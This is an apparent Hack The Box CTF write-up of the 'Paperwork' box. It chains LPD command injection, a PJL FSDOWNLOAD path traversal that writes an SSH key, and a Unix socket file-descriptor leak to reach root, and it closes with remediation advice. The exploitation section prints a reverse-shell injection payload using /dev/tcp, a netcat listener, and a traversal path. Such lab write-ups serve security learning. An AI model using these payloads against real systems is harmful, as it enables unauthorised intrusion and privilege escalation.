HTB Paperwork Writeup
Text

================================================================================
                        HTB BOX WRITEUP: PAPERWORK
================================================================================
Author      : vishalmani-11
Box         : Paperwork (paperwork.htb)
IP          : <IP>
OS          : Linux (unknown)
Difficulty  : Easy
Type        : CTF / Pentest
Date        : 2026-09-13
================================================================================

1. EXECUTIVE SUMMARY
================================================================================

Paperwork is an easy HTB box centered around a legacy printing service. An
information page points to RFC1179 (LPD) which is exposed on a non-standard
port. The LPD implementation is vulnerable to command injection which yields a
reverse shell as the lp user. Local enumeration uncovers a JetDirect/PJL
service listening on 9100 that accepts FSDOWNLOAD commands without validating
paths. By abusing path traversal in FSDOWNLOAD we write an SSH public key into
archivist's ~/.ssh/authorized_keys and SSH in as archivist. From archivist we
find a root-owned paperwork daemon exposing a UNIX domain management socket
(/run/paperwork/mgmt.sock). The daemon uses recvmsg() and accidentally sends
open file descriptors via SCM_RIGHTS; one leaked FD contains an admin
password allowing an immediate su to root.

Impact: Full root compromise via chained LPD injection → PJL path traversal →
Unix socket FD leak.

================================================================================
2. SCOPE & METHODOLOGY
================================================================================

+-------------------------------+----------------------------------------------+
| Target  | paperwork.htb (IP omitted)                      |
| Ports   | 22 (SSH), 80 (HTTP), 1515 (LPD), 9100 (PJL)    |
| Services| LPD (RFC1179), JetDirect/PJL, paperwork-daemon   |
| Exclusions| None                                          |
+-------------------------------+----------------------------------------------+

Phases: Port scan → Web reconnaissance → LPD command injection → local
enumeration → PJL FSDOWNLOAD path traversal → SSH as archivist → UNIX domain
socket analysis → root escalation.

Tools: nmap, netcat, socat, ssh, python3, strings, ss, socat, john/wordlists
(only referenced), standard Linux tooling.

================================================================================
3. ENUMERATION
================================================================================

3.1 Initial web observation

The web application displayed an informational page referencing:

  Protocol            : RFC 1179
  Target Queue        : archive_intake
  Processor           : paperwork-archive-v1.02
  Backend spooler     : PRN-ARCHIVE-01

This strongly suggested a printing-related service (LPD/line printer daemon).

3.2 Port scan

nmap -sC -sV -Pn <IP>

Discovered:
  22/tcp   open  ssh
  80/tcp   open  http
  1515/tcp open  ifor-protocol (LPD)

1515 matched an LPD service (RFC1179) — primary attack surface.

================================================================================
4. EXPLOITATION
================================================================================

4.1 LPD command injection → reverse shell (lp)

LPD accepts hostname, job name, user and queue fields. The LPD implementation
failed to properly sanitize one of these fields (job name or user) and passed
it to a shell. A classic payload was used to get a reverse shell:

  '; bash -i >& /dev/tcp/LHOST/4444 0>&1 #

Attacker:
  nc -lvnp 4444

After submitting a crafted LPD job the attacker received a shell. The account
was lp (uid=7).

================================================================================
5. LOCAL ENUMERATION AS lp
================================================================================

As lp, standard enumeration revealed a local service on 127.0.0.1:9100
(JetDirect/Raw printing/PJL). This port was only bound to localhost and not
externally accessible, but the attacker already had a shell on the host.

Commands used: id, hostname, ps aux, ss -tlnp

================================================================================
6. PJL (JetDirect) ANALYSIS AND FSDOWNLOAD PATH TRAVERSAL
================================================================================

Port 9100 supported PJL. Real printer firmware accepts commands such as:
  @PJL INFO
  @PJL FSQUERY
  @PJL FSDOWNLOAD

FSDOWNLOAD usage (simplified):
  @PJL FSDOWNLOAD NAME="<path>" SIZE=<bytes>
  <raw file contents>

The printing daemon failed to validate the NAME parameter and allowed paths
that traverse out of the printer sandbox. Example accepted path:

  0:./../../../home/archivist/.ssh/authorized_keys

This allowed writing arbitrary file contents anywhere the process user (here
'archivist') could write.

================================================================================
7. WRITING SSH AUTHORIZED_KEYS (ARCHIVIST)
================================================================================

On the attacker machine generate an ed25519 keypair and copy the public key:

  ssh-keygen -t ed25519 -f ~/paperwork/archivist_key -N ""
  cat ~/paperwork/archivist_key.pub

On the target (lp shell) prepare the key and a small Python helper that
connects to 127.0.0.1:9100 and issues an FSDOWNLOAD command with NAME set to
"0:./../../../home/archivist/.ssh/authorized_keys" and the public key as the
file contents. The script used the PJL framing (ESC % -12345 X ... ESC ...).

The daemon wrote the public key into archivist's authorized_keys (the daemon
ran with archivist privileges), enabling SSH access.

Attacker machine:
  ssh -i ~/paperwork/archivist_key archivist@<IP>

Now authenticated as archivist and able to continue enumeration.

================================================================================
8. ENUMERATION AS archivist → discovering paperwork-daemon + mgmt.sock
================================================================================

Standard Linux privilege escalation enumeration was performed:
  sudo -l
  find / -perm -4000 -type f
  getcap -r /
  ps aux
  ss -xlp
  find /run -type s

This revealed a root-owned process paperwork-daemon and a UNIX domain socket:
  /run/paperwork/mgmt.sock

Socket permissions: srw-rw---- root archivist — meaning members of group
'archivist' may connect.

================================================================================
9. MANUAL SOCKET INTERACTION
================================================================================

Connecting manually with socat returned a short status message:

  $ socat - UNIX-CONNECT:/run/paperwork/mgmt.sock
  STATUS: SYSTEM_CLEAN
  SIGNATURE: d92938059e3e5371cf54db65d60963aecacedf69e493c44a8b618036b07cbdbe

The management protocol was custom but indicated the root daemon accepted
requests from archivist.

================================================================================
10. DEEPER ANALYSIS – RECVMSG() & SCM_RIGHTS FD LEAK
================================================================================

Further analysis of the management protocol showed the server used recvmsg()
(instead of recv()) to read client data. recvmsg() supports ancillary data
including SCM_RIGHTS (file descriptor passing). The daemon accidentally sent
ancillary data containing open file descriptors back to the client.

Receiving the ancillary data revealed two leaked FDs (for example FD 5, FD
6). The attacker used os.pread(fd, 4096, 0) to read the contents of these
already-open descriptors without needing a pathname.

One leaked descriptor contained a file with ADMIN_PASSWORD=<REDACTED>.

================================================================================
11. ROOT ESCALATION
================================================================================

With the ADMIN_PASSWORD in hand the attacker escalated to root:

  su
  Password: <REDACTED>

A root shell was obtained and the root flag recovered:
  cat /root/root.txt

================================================================================
12. ATTACK CHAIN SUMMARY
================================================================================

LPD information page → port 1515 (LPD) discovery → LPD command injection →
reverse shell as lp → local enumeration → JetDirect/PJL on 127.0.0.1:9100 →
PJL FSDOWNLOAD path traversal → write archivist ~/.ssh/authorized_keys →
ssh archivist → discover /run/paperwork/mgmt.sock (root:archivist) → recvmsg()
SCM_RIGHTS FD leak → read ADMIN_PASSWORD → su root

================================================================================
13. FLAGS
================================================================================

  - User flag: obtained as archivist (cat /home/archivist/user.txt)
  - Root flag: obtained after su to root (cat /root/root.txt)

================================================================================
14. RECOMMENDATIONS
================================================================================

1. Fix input sanitization in the LPD implementation — do not invoke a shell
   on client-supplied fields.
2. Validate and canonicalize filesystem paths in PJL FSDOWNLOAD; disallow any
   path traversal and restrict writes to an explicit allowed directory.
3. Run network-facing print services with least privilege and reduce attack
   surface: avoid binding admin interfaces to localhost-only ports when not
   necessary, or require strong local authentication.
4. Harden inter-process communication: avoid sending open file descriptors to
   less-privileged clients and validate usage of recvmsg()/SCM_RIGHTS.
5. Rotate any exposed credentials and secrets; remove hardcoded passwords.

================================================================================
                              END OF WRITEUP
================================================================================
